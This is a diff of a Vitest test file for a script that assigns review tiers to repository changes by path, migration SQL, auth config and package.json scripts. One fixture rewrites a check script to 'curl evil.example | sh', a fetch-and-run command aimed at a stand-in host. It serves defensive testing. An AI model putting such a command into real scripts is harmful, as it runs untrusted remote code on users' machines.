@@ -3,9 +3,22 @@ import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
-import { classify, isBelow, parseAddedText, RULES, type Change, type Tier } from './verify-tier.ts';
+import { addedLines, classify, isBelow, RULES, type Change, type Tier } from './verify-tier.ts';
 
-const change = (path: string, addedText = ''): Change => ({ path, addedText });
+const change = (path: string, added = ''): Change => ({ path, before: '', after: added });
+
+const BASE_MANIFEST = { name: 'esta', packageManager: 'pnpm@10.0.0', scripts: { check: 'pnpm lint', lint: 'eslint .' }, dependencies: { zod: '^4.6.5' } };
+const manifest = (before: object, after: object, path = 'package.json'): Change => ({
+  path,
+  before: JSON.stringify(before, null, 2),
+  after: JSON.stringify(after, null, 2),
+});
+const withScripts = (scripts: Record<string, string>) => ({ ...BASE_MANIFEST, scripts: { ...BASE_MANIFEST.scripts, ...scripts } });
+
+const CONFIG_BEFORE = '[api]\nport = 54321\n\n[auth]\nenable_signup = false\n\n[auth.email]\nenable_confirmations = true\n';
+const config = (after: string): Change => ({ path: 'supabase/config.toml', before: CONFIG_BEFORE, after });
+
+const MIGRATION = 'supabase/migrations/20261007301000_x.sql';
 
 const CASES: readonly { readonly change: Change; readonly tier: Tier }[] = [
   ...[
@@ -27,51 +40,119 @@ const CASES: readonly { readonly change: Change; readonly tier: Tier }[] = [
     'packages/core/src/auth/otp.ts',
     'apps/web/src/server/invite.ts',
     'apps/web/src/app/(app)/settings/roles/page.tsx',
+    'packages/core/src/ledger/post.ts',
+    'packages/core/src/invoice/make.ts',
+    'packages/core/src/proposals/execute.ts',
+    'packages/core/src/schemas/payment.ts',
+    'packages/core/src/clock/index.ts',
+    'packages/core/src/money.ts',
+    'packages/core/src/index.ts',
+    'packages/core/tsconfig.json',
+    'apps/agent/src/prompts/system.md',
+    'apps/agent/README.md',
+    'apps/agent/src/tools/household-info.ts',
+    'eslint-rules/service-role-allowlist.mjs',
+    'eslint-rules/no-browser-supabase-client.mjs',
+    'eslint-rules/no-guard-disable.mjs',
+    'apps/web/src/app/onboarding/actions.ts',
+    'apps/web/src/app/onboarding/page.tsx',
+    'supabase/migrations/20261007301000_x.sql',
+    'supabase/migrations/20261007301000_notes.md',
+    'supabase/migrations/old/readme.txt',
   ].map((path) => ({ change: change(path), tier: 'rigorous' as const })),
-  { change: change('apps/web/src/app/onboarding/actions.ts', "await supabase.rpc('claim_invite', { code });"), tier: 'rigorous' },
+  { change: change('apps/web/src/app/(app)/settings/members/actions.ts', "await supabase.rpc('claim_invite', { code });"), tier: 'rigorous' },
+  { change: change('apps/web/src/app/(app)/team/actions.ts', "await supabase.rpc('invite_member', { p_email: email });"), tier: 'rigorous' },
+  { change: change('apps/web/src/app/(app)/team/actions.ts', "await supabase.rpc('create_household', { p_name: name });"), tier: 'rigorous' },
+  { change: change('apps/web/src/app/(app)/team/actions.ts', "await supabase.from('household_members').update({ role }).eq('id', id);"), tier: 'rigorous' },
   { change: change('apps/web/src/app/(app)/page.tsx', 'const role: member_role = member.role;'), tier: 'rigorous' },
-  { change: change('supabase/migrations/20261007301000_x.sql', 'grant select on public.invoices to authenticated;'), tier: 'rigorous' },
-  { change: change('supabase/migrations/20261007301000_x.sql', 'alter table public.leases add column note text;'), tier: 'standard' },
+  { change: change('packages/db/src/database.types.ts', "member_role: 'admin' | 'owner';"), tier: 'rigorous' },
+  { change: change(MIGRATION, 'grant select on public.invoices to authenticated;'), tier: 'rigorous' },
+  { change: change(MIGRATION, 'alter table public.leases add column note text;'), tier: 'rigorous' },
+  { change: config('[api]\nport = 54321\n\n[auth]\nenable_signup = true\n\n[auth.email]\nenable_confirmations = true\n'), tier: 'rigorous' },
+  { change: config('[api]\nport = 54321\n\n[auth]\nenable_signup = false\n'), tier: 'rigorous' },
+  { change: config(`${CONFIG_BEFORE}\n[auth.external.google]\nenabled = true\n`), tier: 'rigorous' },
+  { change: { path: 'supabase/config.toml' }, tier: 'rigorous' },
+  { change: manifest(BASE_MANIFEST, withScripts({ postinstall: 'node scripts/x.ts' })), tier: 'rigorous' },
+  { change: manifest(BASE_MANIFEST, withScripts({ prepare: 'node scripts/x.ts' })), tier: 'rigorous' },
+  { change: manifest(BASE_MANIFEST, withScripts({ precheck: 'node scripts/x.ts' })), tier: 'rigorous' },
+  { change: manifest(BASE_MANIFEST, withScripts({ lint: 'eslint . && node scripts/x.ts' })), tier: 'standard' },
+  { change: manifest(BASE_MANIFEST, { ...withScripts({ postinstall: 'node scripts/x.ts' }), dependencies: {} }, 'apps/web/package.json'), tier: 'rigorous' },
+  { change: config('[api]\nport = 54322\n\n[auth]\nenable_signup = false\n\n[auth.email]\nenable_confirmations = true\n'), tier: 'standard' },
   { change: change('apps/web/src/app/(app)/properties/page.tsx'), tier: 'standard' },
   { change: change('apps/web/src/components/button.tsx'), tier: 'standard' },
-  { change: change('package.json', '    "verify:tier": "node scripts/verify-tier.ts",'), tier: 'lean' },
-  { change: change('package.json', '    "zod": "^4.6.5",'), tier: 'standard' },
+  { change: manifest(BASE_MANIFEST, withScripts({ 'verify:tier': 'node scripts/verify-tier.ts' })), tier: 'lean' },
+  { change: manifest(BASE_MANIFEST, withScripts({ preview: 'next start', 'db:seed': 'node scripts/seed.ts' }), 'apps/web/package.json'), tier: 'lean' },
+  { change: manifest(BASE_MANIFEST, { ...BASE_MANIFEST, dependencies: { ...BASE_MANIFEST.dependencies, 'left-pad': '^1.0.0' } }), tier: 'standard' },
+  { change: manifest(BASE_MANIFEST, { ...withScripts({ extra: 'pnpm lint' }), packageManager: 'pnpm@99.0.0' }), tier: 'standard' },
+  { change: manifest(BASE_MANIFEST, withScripts({ check: 'pnpm lint && pnpm test' })), tier: 'standard' },
+  { change: manifest(BASE_MANIFEST, { ...BASE_MANIFEST, scripts: { check: 'pnpm lint' } }), tier: 'standard' },
+  { change: manifest(BASE_MANIFEST, { ...withScripts({ extra: 'pnpm lint' }), dependencies: {} }), tier: 'standard' },
+  { change: manifest(BASE_MANIFEST, BASE_MANIFEST), tier: 'standard' },
+  { change: { path: 'package.json', before: '', after: JSON.stringify(BASE_MANIFEST) }, tier: 'standard' },
+  { change: { path: 'package.json', before: JSON.stringify(BASE_MANIFEST), after: '{ not json' }, tier: 'standard' },
+  { change: { path: 'package.json' }, tier: 'standard' },
   { change: change('package.json'), tier: 'standard' },
-  { change: change('playwright.config.ts'), tier: 'standard' },
-  { change: change('pnpm-lock.yaml'), tier: 'standard' },
+  ...[
+    'playwright.config.ts',
+    'pnpm-lock.yaml',
+    '.env.example',
+    '.github/workflows/deploy.yml',
+    'supabase/seed/seed.ts',
+    'supabase/seed/README.md',
+    'apps/web/next.config.ts',
+    'apps/web/src/middleware.ts',
+    'eslint.config.mjs',
+    'eslint-rules/no-jsx-literals.mjs',
+    'eslint-rules/lint-text.ts',
+    'scripts/backup.ts',
+    'scripts/db.ts',
+  ].map((path) => ({ change: change(path), tier: 'standard' as const })),
   ...[
     'docs/plan/STATUS.md',
     'CLAUDE.md',
     'packages/core/src/tax/README.md',
-    'eslint-rules/no-jsx-literals.mjs',
-    'eslint.config.mjs',
-    'scripts/verify-tier.ts',
+    'apps/web/src/server/cron/README.md',
     'tools/ci-local.sh',
     'e2e/shell.spec.ts',
+    'e2e/support/seed.ts',
     'packages/core/src/tax/position.test.ts',
     'packages/core/src/allocation/allocate.bench.ts',
     'apps/agent/src/runner.test.ts',
     'apps/agent/src/test/fake-db.ts',
     'apps/web/src/test/render.tsx',
+    'apps/web/src/server/cron/invoices.test.ts',
+    'eslint-rules/service-role-allowlist.test.ts',
+    'scripts/verify-tier.test.ts',
     'supabase/tests/properties.test.sql',
+    'supabase/seed/generator/lint.test.ts',
     'fixtures/agent-replay/ping/abc.json',
   ].map((path) => ({ change: change(path), tier: 'lean' as const })),
 ];
 
-const RISKY_SQL = [
+const MIGRATION_TEXTS = [
   'grant select on public.invoices to authenticated;',
   'REVOKE ALL ON public.invoices FROM anon;',
   'create policy invoices_read on public.invoices for select using (true);',
-  'alter policy invoices_read on public.invoices using (true);',
-  'drop policy invoices_read on public.invoices;',
   'create function private.claim() returns void language sql security definer as $$ select 1 $$;',
   'delete from public.invoices where paid;',
   'drop table public.invoices;',
-  'alter table public.invoices drop column amount;',
-  'truncate public.invoices;',
   "insert into storage.buckets (id, name) values ('documents', 'documents');",
   "select private.enable_household_rls('invoices', 'admin');",
-  'alter table public.invoices enable row level security;',
+  'update public.leases l set rent = rent * 2;',
+  'insert into public.units (id) select id from public.properties;',
+  'create view public.v as select * from private.secret;',
+  "alter type public.member_role add value 'owner';",
+  'merge into public.t using s on true when matched then update set x = 1;',
+  'with a as (select 1) update public.t set x = 1;',
+  'alter table public.payments alter column amount type numeric using amount::numeric;',
+  'create table public.foo (id uuid primary key);',
+  'alter table public.t add column x int;',
+  'create index leases_unit_idx on public.leases (unit_id);',
+  'create extension pg_net;',
+  'create trigger t after insert on auth.users for each row execute function public.f();',
+  'create function public.f() returns int language sql as $$ select 1 $$;',
+  'insert into public.t values (1) on conflict (id)\n  do update set x = 1;',
+  '',
 ];
 
 describe('classify', () => {
@@ -84,13 +165,18 @@ describe('classify', () => {
     expect(uncovered).toEqual([]);
   });
 
-  it.each(RISKY_SQL)('treats a migration adding "%s" as rigorous', (sql) => {
-    expect(classify([change('supabase/migrations/20261007301000_x.sql', sql)]).tier).toBe('rigorous');
+  it.each(MIGRATION_TEXTS)('treats a migration with "%s" as rigorous', (sql) => {
+    expect(classify([change(MIGRATION, sql)]).tier).toBe('rigorous');
   });
 
-  it('keeps a plain column or index migration at standard', () => {
-    const sql = 'create index leases_unit_idx on public.leases (unit_id);\nalter table public.leases add column note text;';
-    expect(classify([change('supabase/migrations/20261007301000_x.sql', sql)]).tier).toBe('standard');
+  it('treats a migration as rigorous when its text could not be read', () => {
+    expect(classify([{ path: MIGRATION }]).tier).toBe('rigorous');
+  });
+
+  it('keeps a file the text cannot be read for at standard, never lean', () => {
+    for (const path of ['apps/web/src/app/(app)/page.tsx', 'package.json', 'infra/caddy/Caddyfile.template', 'pnpm-workspace.yaml']) {
+      expect(classify([{ path }]).tier).toBe('standard');
+    }
   });
 
   it('sends a path no rule names to standard, never lean, and says why', () => {
@@ -99,6 +185,14 @@ describe('classify', () => {
     expect(result.reasons).toHaveLength(1);
     expect(result.reasons[0]).toContain('infra/caddy/Caddyfile.template');
     expect(result.reasons[0]).toContain('no rule');
+  });
+
+  it('sends a path no rule names in the domain core or the assistant worker to rigorous', () => {
+    for (const path of ['packages/core/src/ledger/post.ts', 'apps/agent/src/prompts/system.md', 'packages/core/vitest.config.ts']) {
+      const result = classify([change(path)]);
+      expect(result.tier).toBe('rigorous');
+      expect(result.reasons[0]).toContain(path);
+    }
   });
 
   it('lets the highest tier win whatever the order of the files', () => {
@@ -149,38 +243,22 @@ describe('isBelow', () => {
   });
 });
 
-describe('parseAddedText', () => {
-  const diff = [
-    'diff --git a/docs/a.md b/docs/a.md',
-    'index 111..222 100644',
-    '--- a/docs/a.md',
-    '+++ b/docs/a.md',
-    '@@ -1,0 +2 @@',
-    '+first added',
-    '@@ -9 +10,2 @@',
-    '-removed',
-    '+second added',
-    '++++ looks like a header but is content',
-    'diff --git a/supabase/migrations/1_x.sql b/supabase/migrations/1_x.sql',
-    'new file mode 100644',
-    '--- /dev/null',
-    '+++ b/supabase/migrations/1_x.sql',
-    '@@ -0,0 +1 @@',
-    '+grant all on x to y;',
-    '\\ No newline at end of file',
-    'diff --git a/old.ts b/old.ts',
-    'deleted file mode 100644',
-    '--- a/old.ts',
-    '+++ /dev/null',
-    '@@ -1 +0,0 @@',
-    '-gone',
-  ].join('\n');
+describe('addedLines', () => {
+  it('returns the lines the change adds and nothing else', () => {
+    expect(addedLines({ path: 'a', before: 'one\ntwo\n', after: 'one\nthree\ntwo\n' })).toEqual(['three']);
+  });
 
-  it('collects the added lines of each file and nothing else', () => {
-    const added = parseAddedText(diff);
-    expect(added.get('docs/a.md')).toBe('first added\nsecond added\n+++ looks like a header but is content');
-    expect(added.get('supabase/migrations/1_x.sql')).toBe('grant all on x to y;');
-    expect(added.has('old.ts')).toBe(false);
+  it('counts a line that appears more often after than before', () => {
+    expect(addedLines({ path: 'a', before: 'x\ny', after: 'x\nx\ny' })).toEqual(['x']);
+  });
+
+  it('returns every line of a new file', () => {
+    expect(addedLines({ path: 'a', before: '', after: 'x\ny' })).toEqual(expect.arrayContaining(['x', 'y']));
+  });
+
+  it('is undefined when either side could not be read', () => {
+    expect(addedLines({ path: 'a', before: 'x' })).toBeUndefined();
+    expect(addedLines({ path: 'a', after: 'x' })).toBeUndefined();
   });
 });
 
@@ -194,7 +272,7 @@ describe('verify:tier command', () => {
     return result.stdout;
   };
 
-  const write = (path: string, text: string) => {
+  const write = (path: string, text: string | Buffer) => {
     mkdirSync(dirname(join(repo, path)), { recursive: true });
     writeFileSync(join(repo, path), text);
   };
@@ -213,6 +291,9 @@ describe('verify:tier command', () => {
     write('scripts/draft.sql', 'grant select on public.invoices to authenticated;\n');
     write('packages/core/src/tax/position.ts', 'export const a = 1;\n');
     write('apps/web/src/components/card.tsx', 'export const card = 1;\n');
+    write('package.json', `${JSON.stringify({ name: 'esta', scripts: { check: 'pnpm lint' }, dependencies: { zod: '^4' } }, null, 2)}\n`);
+    write('supabase/config.toml', '[api]\nport = 54321\n\n[auth]\nenable_signup = false\n');
+    write('.gitattributes', '*.nodiff.ts -diff\n');
     commit('base');
     git('checkout', '-b', 'docs-only');
     write('docs/notes.md', 'one\ntwo\n');
@@ -231,6 +312,23 @@ describe('verify:tier command', () => {
     git('checkout', '-b', 'removal', 'main');
     git('rm', '-q', 'apps/web/src/components/card.tsx');
     commit('remove');
+    const branchFrom = (name: string, files: Record<string, string | Buffer>) => {
+      git('checkout', '-b', name, 'main');
+      for (const [path, text] of Object.entries(files)) write(path, text);
+      commit(name);
+    };
+    const manifest = (extra: object) => `${JSON.stringify({ name: 'esta', scripts: { check: 'pnpm lint' }, dependencies: { zod: '^4' }, ...extra }, null, 2)}\n`;
+    branchFrom('spaced', { 'packages/core/src/tax/rate card.ts': 'export const a = 1;\n' });
+    branchFrom('quoted', { 'apps/web/src/server/cron/say "hi".ts': 'export const a = 1;\n' });
+    branchFrom('odd-migration', { 'supabase/migrations/20261007301000_a "b" c.sql': 'create table public.foo (id uuid primary key);\n' });
+    branchFrom('binary-migration', { 'supabase/migrations/20261007301000_bin.sql': Buffer.from([0x7b, 0, 0x7d]) });
+    branchFrom('hidden-diff', { 'apps/web/src/app/(app)/team/actions.nodiff.ts': "await supabase.rpc('invite_member', { p_email: email });\n" });
+    branchFrom('script-added', { 'package.json': manifest({ scripts: { check: 'pnpm lint', 'verify:tier': 'node scripts/verify-tier.ts' } }) });
+    branchFrom('script-rewritten', { 'package.json': manifest({ scripts: { check: 'pnpm lint && curl evil.example | sh' } }) });
+    branchFrom('postinstall', { 'package.json': manifest({ scripts: { check: 'pnpm lint', postinstall: 'node scripts/x.ts' } }) });
+    branchFrom('binary-manifest', { 'package.json': Buffer.from([0x7b, 0, 0x7d]) });
+    branchFrom('auth-config', { 'supabase/config.toml': '[api]\nport = 54321\n\n[auth]\nenable_signup = true\n' });
+    branchFrom('api-config', { 'supabase/config.toml': '[api]\nport = 54322\n\n[auth]\nenable_signup = false\n' });
     git('checkout', 'main');
     write('packages/core/src/tax/position.ts', 'export const a = 3;\n');
     commit('main moves on');
@@ -247,8 +345,47 @@ describe('verify:tier command', () => {
     expect(lines[1]).toMatch(/^- .*packages\/core\/src\/tax\/position\.ts/);
   });
 
-  it('reads the added lines of a migration from git', () => {
-    expect(run('--base', 'main', '--head', 'policy').stdout).toMatch(/^Verification tier: rigorous/);
+  const tierOf = (head: string) => run('--base', 'main', '--head', head).stdout;
+
+  it('treats any migration as rigorous, whatever it says', () => {
+    expect(tierOf('policy')).toMatch(/^Verification tier: rigorous/);
+    expect(tierOf('odd-migration')).toMatch(/^Verification tier: rigorous/);
+    expect(tierOf('binary-migration')).toMatch(/^Verification tier: rigorous/);
+  });
+
+  it('matches the folder rule of a path with a space', () => {
+    const out = tierOf('spaced');
+    expect(out).toMatch(/^Verification tier: rigorous/);
+    expect(out).toContain('packages/core/src/tax/rate card.ts');
+  });
+
+  it('matches the folder rule of a path with a quote', () => {
+    const out = tierOf('quoted');
+    expect(out).toMatch(/^Verification tier: rigorous/);
+    expect(out).toContain('apps/web/src/server/cron/say "hi".ts');
+    expect(tierOf('odd-migration')).toContain('a "b" c.sql');
+  });
+
+  it('reads added text even where .gitattributes hides the diff', () => {
+    expect(tierOf('hidden-diff')).toMatch(/^Verification tier: rigorous/);
+  });
+
+  it('calls a package.json that only adds a script lean', () => {
+    expect(tierOf('script-added')).toMatch(/^Verification tier: lean/);
+  });
+
+  it('calls a rewritten script standard and a new postinstall rigorous', () => {
+    expect(tierOf('script-rewritten')).toMatch(/^Verification tier: standard/);
+    expect(tierOf('postinstall')).toMatch(/^Verification tier: rigorous/);
+  });
+
+  it('never calls a package.json lean when its text cannot be read', () => {
+    expect(tierOf('binary-manifest')).toMatch(/^Verification tier: standard/);
+  });
+
+  it('calls a changed auth setting rigorous and another setting standard', () => {
+    expect(tierOf('auth-config')).toMatch(/^Verification tier: rigorous/);
+    expect(tierOf('api-config')).toMatch(/^Verification tier: standard/);
   });
 
   it('reads the whole text of a file moved into the migrations folder', () => {
